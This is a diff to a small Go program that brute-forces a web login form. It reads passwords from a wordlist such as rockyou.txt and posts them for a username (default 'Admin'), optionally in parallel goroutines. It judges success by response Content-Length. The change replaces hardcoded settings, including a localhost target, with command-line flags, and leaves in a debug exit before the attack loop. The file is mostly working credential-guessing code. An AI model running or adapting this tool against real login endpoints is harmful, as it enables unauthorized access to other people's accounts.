@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"flag"
 	"fmt"
 	"log"
 	"net/http"
@@ -11,43 +12,47 @@ import (
 )
 
 func main() {
-	pass := readFile("/usr/share/wordlists/rockyou.txt")
-	// pass := readFile("medium.txt")
 
-	concurrent := 0
-	
-	
-	url := "http://localhost:8080/login"
-
+	var concurrent int
 	var good, bad int64
-	good = 209
-	bad = 219
-	user := "Admin"
+	var url, username, worldlistFile string
 
-  if concurrent == 0 {
-    for _, passwd := range pass {
-      status, _ := request(url, user, passwd, good, bad)
-      fmt.Println(status, passwd)
-      if status {
-        fmt.Println("XXXXXX FFFFFOUND")
-        os.Exit(0)
-      }
-    }
-  } else {
-    size := len(pass) / concurrent
-	  chunks := sliceChunks(pass, size)
-    ch := make(chan string)
-    for _, chunk := range chunks {
-      for i := range chunk {
+	// set a and b as flag int vars
+	flag.IntVar(&concurrent, "concurrent", 0, "Number of concurrent requests")
+	flag.Int64Var(&good, "good", -1, "Content-Lenght of a success request")
+	flag.Int64Var(&bad, "bad", -1, "Content-Lenght of a non success request")
+	flag.StringVar(&url, "url", "", "URL")
+	flag.StringVar(&username, "username", "Admin", "Username var")
+	flag.StringVar(&worldlistFile, "wordlist", "/usr/share/wordlists/rockyou.txt", "Wordlist file")
+	flag.Parse()
+	fmt.Println(concurrent, good, bad, url)
+	os.Exit(0)
 
-        go requestParallel(url, user, chunk[i], good, bad, ch)
-      }
+	pass := readFile(worldlistFile)
 
-      for range chunk {
-        fmt.Println(<-ch)
-      }
-    }
-  }
+	if concurrent == 0 {
+		for _, passwd := range pass {
+			status, _ := request(url, username, passwd, good, bad)
+			fmt.Println(status, passwd)
+			if status {
+				fmt.Println("XXXXXX FFFFFOUND")
+				os.Exit(0)
+			}
+		}
+	} else {
+		size := len(pass) / concurrent
+		chunks := sliceChunks(pass, size)
+		ch := make(chan string)
+		for _, chunk := range chunks {
+			for i := range chunk {
+				go requestParallel(url, username, chunk[i], good, bad, ch)
+			}
+
+			for range chunk {
+				fmt.Println(<-ch)
+			}
+		}
+	}
 }
 
 func fatal(err error) {
